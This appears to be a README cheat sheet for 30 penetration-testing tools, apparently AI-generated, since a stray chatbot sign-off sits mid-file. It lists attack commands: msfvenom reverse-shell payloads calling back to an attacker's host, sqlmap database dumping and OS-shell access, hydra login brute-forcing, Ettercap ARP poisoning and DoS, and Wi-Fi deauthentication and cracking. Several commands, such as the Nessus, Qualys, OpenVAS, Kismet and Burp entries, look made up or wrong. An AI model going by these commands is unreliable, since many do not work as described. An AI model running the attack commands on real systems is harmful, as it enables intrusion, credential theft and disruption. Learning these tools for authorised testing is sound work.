```markdown
# Top 30 Cybersecurity Tools to Learn

Master the art of penetration testing with this curated list of top 30 cybersecurity tools. From network scanners to web application testers, and from mobile app security tools to reverse engineering frameworks, this repository covers a diverse range of tools that will enhance your cybersecurity skills.

## Table of Contents

1. [Nessus](#1-nessus)
2. [Qualys](#2-qualys)
3. [OpenVAS](#3-openvas)
4. [Nmap/ZenMap](#4-nmapzenmap)
5. [Wireshark](#5-wireshark)
6. [Metasploit Framework](#6-metasploit-framework)
7. [Aircrack-ng](#7-aircrack-ng)
8. [Kismet](#8-kismet)
9. [Burp Suite](#9-burp-suite)
10. [OWASP ZAP](#10-owasp-zap)
11. [Netsparker](#11-netsparker)
12. [sqlmap](#12-sqlmap)
13. [W3af](#13-w3af)
14. [BeEF](#14-beef)
15. [MobSF](#15-mobsf)
16. [Dex2jar](#16-dex2jar)
17. [APK Inspector](#17-apk-inspector)
18. [Kali Linux](#18-kali-linux)
19. [Social-Engineer Toolkit (SET)](#19-social-engineer-toolkit-set)
20. [John the Ripper](#20-john-the-ripper)
21. [Ettercap](#21-ettercap)
22. [Radare2](#22-radare2)
23. [IDA Pro](#23-ida-pro)
24. [Hunter.io](#24-hunterio)
25. [Skrapp](#25-skrapp)
26. [Dnsdumpster](#26-dnsdumpster)
27. [Retina](#27-retina)
28. [Hexway](#28-hexway)
29. [FuzzDB](#29-fuzzdb)
30. [Hex Editor (Bless)](#30-hex-editor-bless)

## How to Use This Repository

1. **Clone the Repository:**
   ```bash
   git clone https://github.com/your-username/cybersecurity-tools.git
   cd cybersecurity-tools
   ```

2. **Explore the Tools:**
   - Each tool has its dedicated section in the README.md file.
   - Navigate to the specific tool you want to learn about or use.

3. **Commands and Usage:**
   - Find basic, intermediate, and advanced commands for each tool.
   - Follow the provided structure:
     ```plaintext
     Basic Commands:
       1. command1 - What it does.
       2. command2 - What it does.
       
     Intermediate Commands:
       1. command1 - What it does.
       2. command2 - What it does.
       
     Advanced Commands:
       1. command1 - What it does.
       2. command2 - What it does.
     ```

4. **Contribute:**
   - If you have additional commands or insights, feel free to contribute!
   - Fork the repository, make your changes, and submit a pull request.

5. **Customization:**
   - Tailor the README.md to fit your preferences or add personal experiences.
   - Share your own tips and tricks for each tool.

6. **Stay Updated:**
   - Keep your local repository up-to-date with any changes.
   ```bash
   git pull origin main
   ```

7. **Explore Further:**
   - Use this repository as a starting point for further exploration and learning.
   - Join cybersecurity forums, communities, and events to stay connected.

8. **Happy Learning and Hacking!**

If you encounter any issues, have suggestions, or want to contribute, please create an issue or submit a pull request. This repository is designed to be a collaborative resource for cybersecurity enthusiasts and professionals.
```

Feel free to use and customize this README.md for your repository. If you have any additional requests or changes you'd like, let me know!


## Network Scanning and Vulnerability Assessment

### 1. Nessus

- **Description:** Nessus is a powerful vulnerability scanner used for identifying security vulnerabilities.

- **Basic Commands:**
  1. `nessuscli scan --targets <target> -n "My Scan" -r <report_id>` - Start a vulnerability scan.
  2. `nessuscli export <report_id> file.csv` - Export scan results to CSV.
  3. `nessuscli scan --list` - List all active scans.

- **Intermediate Commands:**
  1. `nessuscli policy list` - List available scan policies.
  2. `nessuscli scan cancel <scan_id>` - Cancel an ongoing scan.
  3. `nessuscli plugin list --severity 3` - List plugins by severity level.

- **Advanced Commands:**
  1. `nessuscli scan --policies "Full Audit" --target <target>` - Run a scan with a specific policy.
  2. `nessuscli feed --register <activation_code>` - Register Nessus with a new activation code.
  3. `nessuscli history export <scan_id> --format nessus` - Export scan history in Nessus format.

### 2. Qualys

- **Description:** Qualys is a cloud-based vulnerability management and assessment platform.

- **Basic Commands:**
  1. `qualyscmd scan -n "My Qualys Scan" -r <option>` - Start a scan with specified options.
  2. `qualyscmd scan -listScans` - List all active scans.
  3. `qualyscmd report -id <report_id> -o <output_format>` - Generate a report in the specified format.

- **Intermediate Commands:**
  1. `qualyscmd assetgroup -list` - List all asset groups.
  2. `qualyscmd optionprofile -list` - List available option profiles.
  3. `qualyscmd scan -cancel -id <scan_id>` - Cancel an ongoing scan.

- **Advanced Commands:**
  1. `qualyscmd auth -logout` - Log out from the Qualys session.
  2. `qualyscmd scan -template "Advanced Scan" -n "My Advanced Scan" -r <option>` - Run an advanced scan.

### 3. OpenVAS

- **Description:** OpenVAS is an open-source vulnerability scanning framework.

- **Basic Commands:**
  1. `openvasmd --create-scanner=<name> --scanner-host=<host>` - Create a scanner configuration.
  2. `openvasmd --create-target=<target>` - Create a target for scanning.
  3. `openvasmd --create-task=<name> --target=<target>` - Create a task for scanning.

- **Intermediate Commands:**
  1. `openvasmd --get-scanners` - List available scanners.
  2. `openvasmd --get-targets` - List configured targets.
  3. `openvasmd --get-tasks` - List configured tasks.

- **Advanced Commands:**
  1. `openvasmd --delete-scanner=<name>` - Delete a scanner configuration.
  2. `openvasmd --delete-target=<target>` - Delete a target configuration.
  3. `openvasmd --delete-task=<task>` - Delete a task configuration.

### 4. Nmap/ZenMap

- **Description:** Nmap is a versatile network scanning tool used for discovering hosts and services on a computer network.

- **Basic Commands:**
  1. `nmap -sP <target>` - Ping scan to discover live hosts.
  2. `nmap -A <target>` - Aggressive scan for detailed information.
  3. `nmap -oN output.txt <target>` - Save results to a file.

- **Intermediate Commands:**
  1. `nmap -p 80,443 <target>` - Scan specific ports.
  2. `nmap -O <target>` - OS detection scan.
  3. `nmap -sU <target>` - UDP scan.

- **Advanced Commands:**
  1. `nmap --script vuln <target>` - Run specific Nmap scripts for vulnerability detection.
  2. `nmap -v -sS <target>` - Verbose and stealthy SYN scan.
  3. `nmap --traceroute <target>` - Perform a traceroute.

### 5. Wireshark

- **Description:** Wireshark is a network protocol analyzer used for network troubleshooting, analysis, and software development.

- **Basic Commands:**
  1. `wireshark` - Open the Wireshark graphical user interface.
  2. `tshark -i <interface> -c <packet_count>` - Capture packets from the command line.
  3. `editcap -c 100 input.pcap output.pcap` - Limit the number of packets in a capture file.

- **Intermediate Commands:**
  1. `wireshark -r input.pcap -Y "http.request.method == POST"` - Display only POST requests.
  2. `tshark -r input.pcap -q -z io,phs` - Display a summary of IO and protocol hierarchy statistics.

- **Advanced Commands:**
  1. `tshark -r input.pcap -T fields -e frame.time -e ip.src -e ip.dst -E separator=, > output.csv` - Export packet details to a CSV file.
  2. `capinfos input.pcap` - Display basic information about a capture file.

### 6. Metasploit Framework

- **Description:** Metasploit Framework is an open-source penetration testing framework for developing, testing, and executing exploit code.

- **Basic Commands:**
  1. `msfconsole` - Open the Metasploit console.
  2. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe > shell.exe` - Generate a reverse shell payload.

- **Intermediate Commands:**
  1. `msfconsole -x "use auxiliary/scanner/http/http_version; set RHOSTS <target>; run"` - Run a specific Metasploit module.
  2. `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf > shell.elf` - Generate a Linux reverse shell payload.

- **Advanced Commands:**
  1. `msfconsole -r script.rc` - Run a script with multiple commands.
  2. `msfdb init` - Initialize the Metasploit database.
  3. `msfvenom --list payloads` - List available payloads.

### 7. Aircrack-ng

- **Description:** Aircrack-ng is a suite of tools for assessing and cracking Wi-Fi networks.

- **Basic Commands:**
  1. `airmon-ng start wlan0` - Start monitor mode.
  2. `airodump-ng --channel 6 --bssid 00:11:22:33:44:55 -w output ath0` - Capture WPA handshake.
  3. `aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 00:11:22:33:44:56 ath0` - Deauthenticate a client.

- **Intermediate Commands:**
  1. `aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture_file.cap` - Crack WEP key.
  2. `aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 -e target_ssid capture_file.cap` - Crack WPA key.
  3. `airmon-ng stop wlan0` - Stop monitor mode.

- **Advanced Commands:**
  1. `aircrack-ng -K -b 00:11:22:33:44:55 -e target_ssid capture_file.cap` - Use coWPAtty to crack WPA key.
  2. `airdecap-ng -b 00:11:22:33:44:55 -e target_ssid -p passphrase capture_file.cap` - Decrypt WEP or WPA traffic.
  3. `airtun-ng -s <target> -a 00:11:22:33:44:55` - Create a virtual tunnel interface.

### 8. Kismet

- **Description:** Kismet is a wireless network detector, sniffer, and intrusion detection system.

- **Basic Commands:**
  1. `kismet` - Open the Kismet console.
  2. `kismet -c wlan0` - Start Kismet on a specific wireless interface.
  3. `kismet -p output_directory` - Set the output directory for Kismet logs.

- **Intermediate Commands:**
  1. `kismet -n` - Disable the graphical interface.
  2. `kismet -q` - Run Kismet in quiet mode.
  3. `kismet -f output_file` - Log output to a specific file.

- **Advanced Commands:**
  1. `kismet -c wlan0 -L` - Log all packets to a pcap file.
  2. `kismet -c wlan0 -x` - Enable GPS support for logging.
  3. `kismet -c wlan0 --channel-hop` - Enable channel hopping.

### 9. Burp Suite

- **Description:** Burp Suite is an integrated platform for performing security testing of web applications.

- **Basic Commands:**
  1. `java -jar burpsuite.jar` - Launch Burp Suite.
  2. `Ctrl + Shift + B` - Open Burp's embedded browser.

- **Intermediate Commands:**
  1. `Ctrl + Shift + P` - Launch the Burp plugin manager.
  2. `Ctrl + Shift + R` - Send a request to Repeater for further analysis.
  3. `Ctrl + Shift + T` - Send a request to the active scanner.

- **Advanced Commands:**
  1. `Ctrl + Shift + C` - Copy as curl command for terminal.
  2. `Ctrl + Alt + M` - Open the Burp extender.
  3. `Ctrl + Shift + E` - Send a request to Intruder for automated attacks.

### 10. OWASP ZAP

- **Description:** OWASP Zed Attack Proxy (ZAP) is a widely used open-source web application security testing tool.

- **Basic Commands:**
  1. `zap.sh` - Start ZAP in GUI mode.
  2. `zap.sh -daemon -port 8080 -config api.disablekey=true` - Start ZAP in headless mode.

- **Intermediate Commands:**
  1. `zap-cli -p 8080 status` - Check ZAP's status.
  2. `zap-cli -p 8080 open-url https://example.com` - Open a target URL.

- **Advanced Commands:**
  1. `zap-cli -p 8080 -v -f "spider" -u https://example.com` - Run a spider scan.
  2. `zap-cli -p 8080 -v -f "activeScan" -r https://example.com` - Run an active scan.
  3. `zap-cli -p 8080 -v -f "quick-scan" -u https://example.com` - Run a quick scan.

### 11. Netsparker

- **Description:** Netsparker is a commercial web application security scanner.

- **Basic Commands:**
  1. `netsparker` - Start Netsparker.
  2. `netsparker scan -u https://example.com` - Start a new scan.

- **Intermediate Commands:**
  1. `netsparker scan-list` - List all active scans.
  2. `netsparker scan-pause -i <scan_id>` - Pause an ongoing scan.

- **Advanced Commands:**
  1. `netsparker scan-details -i <scan_id>` - View detailed information about a scan.
  2. `netsparker scan-resume -i <scan_id>` - Resume a paused scan.
  3. `netsparker generate-report -i <scan_id> -t pdf` - Generate a PDF report for a scan.

### 12. sqlmap

- **Description:** sqlmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws.

- **Basic Commands:**
  1. `sqlmap -u "https://example.com/?id=1"` - Test a single URL for SQL injection.
  2. `sqlmap -r request.txt` - Test a request file for SQL injection.

- **Intermediate Commands:**
  1. `sqlmap -u "https://example.com/?id=1" --dbs` - Enumerate available databases.
  2. `sqlmap -u "https://example.com/?id=1" -D dbname --tables` - List tables in a database.

- **Advanced Commands:**
  1. `sqlmap -u "https://example.com/?id=1" -D dbname -T users --dump` - Dump data from a specific table.
  2. `sqlmap -u "https://example.com/?id=1" --os-shell` - Get an interactive OS shell.

### 13. W3af

- **Description:** w3af is an open-source web application security scanner.

- **Basic Commands:**
  1. `w3af_console` - Start w3af in console mode.
  2. `w3af_gui` - Start w3af in GUI mode.

- **Intermediate Commands:**
  1. `target <target>` - Set the target URL.
  2. `plugin_scan webapp sqli` - Run a SQL injection scan.

- **Advanced Commands:**
  1. `grep_set greps/known_greps` - Use predefined grep settings.
  2. `back` - Go back to the main menu.
  3. `output list` - Display available output plugins.

### 14. BeEF

- **Description:** BeEF (Browser Exploitation Framework) is a penetration testing tool focused on web browsers.

- **Basic Commands:**
  1. `./beef` - Start the BeEF server.
  2. `show` - Show available modules.

- **Intermediate Commands:**
  1. `use <module>` - Use a specific module.
  2. `set target http://target.com` - Set the target URL.

- **Advanced Commands:**
  1. `set bind_port 3000` - Set the listening port.
  2. `exploit` - Execute the selected module.

### 15. MobSF

- **Description:** Mobile Security Framework (MobSF) is an open-source mobile application security testing tool.

- **Basic Commands:**
  1. `./setup.sh` - Setup MobSF.
  2. `./run.sh` - Run MobSF.

- **Intermediate Commands:**
  1. Access the web interface at `http://localhost:8000`.
  2. Upload mobile application files for analysis.

- **Advanced Commands:**
  1. Review generated reports for identified vulnerabilities.
  2. Explore detailed analysis results for each app.

### 16. Dex2jar

- **Description:** Dex2jar is a tool to work with Android `.dex` and Java `.class` files.

- **Basic Commands:**
  1. `d2j-dex2jar.sh classes.dex` - Convert a DEX file to JAR.
  2. `d2j-jar2dex.sh -f classes.jar` - Convert a JAR file back to DEX.

- **Intermediate Commands:**
  1. `d2j-jar2jasmin.sh -f classes.jar` - Convert a JAR file to Jasmin assembly.
  2. `d2j-apk-sign.sh -f test.apk` - Sign an APK file.

- **Advanced Commands:**
  1. `d2j-smali.sh -f classes.dex` - Convert DEX to Smali assembly.
  2. `d2j-dex-recompute-checksum.sh -f classes.dex` - Recompute the DEX file checksum.

### 17. APK Inspector

- **Description:** APK Inspector is a powerful GUI tool for analyzing Android applications.

- **Basic Commands:**
  1. Open the APK Inspector GUI.
  2. Load an APK file for analysis.

- **Intermediate Commands:**
  1. Analyze the app's manifest file.
  2. Explore the app's resource files.

- **Advanced Commands:**
  1. Review the app's components, permissions, and activities.
  2. Inspect the app's code and identify potential vulnerabilities.

### 18. Kali Linux

- **Description:** Kali Linux is a Debian-derived Linux distribution designed for digital forensics and penetration testing.

- **Basic Commands:**
  1. `startx` - Start the graphical user interface.
  2. `ifconfig` - Display network interfaces.

- **Intermediate Commands:**
  1. `nmap -sP 192.168.1.0/24` - Perform a network scan.
  2. `hydra -l admin -P password_list.txt -f 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"`

- **Advanced Commands:**
  1. `msfconsole` - Launch the Metasploit console.
  2. `airmon-ng` - Enable or disable monitor mode for wireless interfaces.
  3. `wireshark` - Start the Wireshark packet analyzer.

### 19. Social-Engineer Toolkit (SET)

- **Description:** The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering attacks.

- **Basic Commands:**
  1. `setoolkit` - Start the Social-Engineer Toolkit.
  2. Select the desired attack option from the menu.

- **Intermediate Commands:**
  1. `1` - Spear-Phishing Attack Vectors.
  2. `2` - Website Attack Vectors.

- **Advanced Commands:**
  1. `3` - Infectious Media Generator.
  2. `99` - Exit the Social-Engineer Toolkit.

### 20. John the Ripper

- **Description:** John the Ripper is a widely used password cracking tool.

- **Basic Commands:**
  1. `john --wordlist=passwords.txt hashfile` - Crack password hashes using a wordlist.
  2. `john --incremental hashfile` - Perform incremental brute force.

- **Intermediate Commands:**
  1. `john --rules --wordlist=passwords.txt hashfile` - Apply rules to the wordlist.
  2. `john --show hashfile` - Display cracked passwords.

- **Advanced Commands:**
  1. `john --format=raw-md5 --wordlist=passwords.txt hashfile` - Specify hash format.
  2. `john --fork=4 --wordlist=passwords.txt hashfile` - Use multiple CPU cores.

### 21. Ettercap

- **Description:** Ettercap is a comprehensive, mature suite for man-in-the-middle attacks.

- **Basic Commands:**
  1. `ettercap -G` - Start Ettercap in the graphical user interface.
  2. Select the target and start the attack.

- **Intermediate Commands:**
  1. `ettercap -Tq -M arp:remote /192.168.1.1/ /192.168.1.2/` - Perform an ARP poisoning attack.
  2. `ettercap -T -q -F filter.eci -M ARP /192.168.1.1/` - Use a custom filter.

- **Advanced Commands:**
  1. `ettercap -T -q -i wlan0 -M ARP /192.168.1.1/` - Specify the network interface.
  2. `ettercap -T -q -M dos_attacks` - Perform a denial-of-service attack.

### 22. Radare2

- **Description:** Radare2 is a powerful open-source framework for reverse engineering and binary analysis.

- **Basic Commands:**
  1. `radare2 binary` - Start Radare2 on a binary file.
  2. `aaa` - Analyze the binary.

- **Intermediate Commands:**
  1. `V` - Enter visual mode.
  2. `pdf` - Display the disassembly.

- **Advanced Commands:**
  1. `afvd` - Visualize functions in a graph.
  2. `iz~password` - Search for the string "password" in the binary.

### 23. IDA Pro

- **Description:** IDA Pro is a commercial disassembler used for reverse engineering.

- **Basic Commands:**
  1. Open the IDA Pro GUI.
  2. Load a binary file for analysis.

- **Intermediate Commands:**
  1. Analyze the binary and explore the disassembly.
  2. Rename functions and variables.

- **Advanced Commands:**
  1. Use IDAPython for scripting and automation.
  2. Set breakpoints and analyze runtime behavior.

### 24. Hunter.io

- **Description:** Hunter.io is an email finding and verification tool.

- **Basic Commands:**
  1. Visit the Hunter.io website.
  2. Enter the domain to find associated email addresses.

- **Intermediate Commands:**
  1. Use the Hunter.io API for programmatic access.
  2. Explore additional features like email verification.

- **Advanced Commands:**
  1. Integrate Hunter.io with other tools through the API.
  2. Leverage the Hunter.io Chrome extension for quick lookups.

### 25. Skrapp

- **Description:** Skrapp is a web data scraping tool for extracting email addresses from websites.

- **Basic Commands:**
  1. Install the Skrapp Chrome extension.
  2. Open a website and click on the extension to extract emails.

- **Intermediate Commands:**
  1. Set up custom search criteria for targeted extraction.
  2. Export the extracted email addresses to a CSV file.

- **Advanced Commands:**
  1. Explore Skrapp's advanced filtering options.
  2. Integrate Skrapp with CRM tools for seamless workflow.

### 26. Dnsdumpster

- **Description:** Dnsdumpster is an online tool for DNS reconnaissance and information gathering.

- **Basic Commands:**
  1. Visit the Dnsdumpster website.
  2. Enter the target domain for DNS information.

- **Intermediate Commands:**
  1. Explore the graphical representation of DNS information.
  2. Identify subdomains and associated IP addresses.

- **Advanced Commands:**
  1. Use Dnsdumpster API for programmatic access.
  2. Cross-reference DNS information with other reconnaissance tools.

### 27. Retina

- **Description:** Retina is a network vulnerability scanner.

- **Basic Commands:**
  1. Launch the Retina GUI.
  2. Configure a new scan by specifying the target.

- **Intermediate Commands:**
  1. Customize vulnerability checks and severity levels.
  2. Schedule recurring scans for ongoing security assessments.

- **Advanced Commands:**
  1. Integrate Retina with other security tools.
  2. Review detailed reports and remediation suggestions.

### 28. Hexway

- **Description:** Hexway is a security platform offering vulnerability scanning and intrusion detection.

- **Basic Commands:**
  1. Access the Hexway platform.
  2. Create a new scanning profile for a target.

- **Intermediate Commands:**
  1. Configure advanced scanning options and policies.
  2. Set up automated scans and notifications.

- **Advanced Commands:**
  1. Integrate Hexway with SIEM solutions.
  2. Utilize Hexway's API for custom integrations.

### 29. FuzzDB

- **Description:** FuzzDB is a comprehensive collection of fuzzing payloads for web application testing.

- **Basic Commands:**
  1. Download FuzzDB from the GitHub repository.
  2. Integrate FuzzDB payloads into your testing tool.

- **Intermediate Commands:**
  1. Customize and create your fuzzing payloads.
  2. Explore different categories of payloads (XSS, SQLi, etc.).

- **Advanced Commands:**
  1. Contribute to the FuzzDB project on GitHub.
  2. Share your custom fuzzing payloads with the community.

### 30. Hex Editor (Bless)

- **Description:** Bless is a high-quality, feature-rich hex editor.

- **Basic Commands:**
  1. `bless` - Launch the Bless hex editor.
  2. Open a file for hexadecimal and text editing.

- **Intermediate Commands:**
  1. Navigate through the hex and ASCII sections.
  2. Edit and save changes to the file.

- **Advanced Commands:**
  1. Use regular expressions for search and replace.
  2. Analyze binary file structures and interpret data.

### Conclusion

Congratulations! You've explored a diverse set of cybersecurity tools, ranging from network scanners to web application testers, and from mobile app security tools to reverse engineering frameworks. Each tool serves a unique purpose in the vast field of cybersecurity, enabling professionals to assess and fortify the security posture of systems and applications.

Remember, ethical hacking and cybersecurity require continuous learning and adaptation. Stay curious, practice responsibly, and contribute to the cybersecurity community.

Feel free to customize this README.md file for your repository, adding your own insights, tips, and experiences with these tools.

Happy hacking!


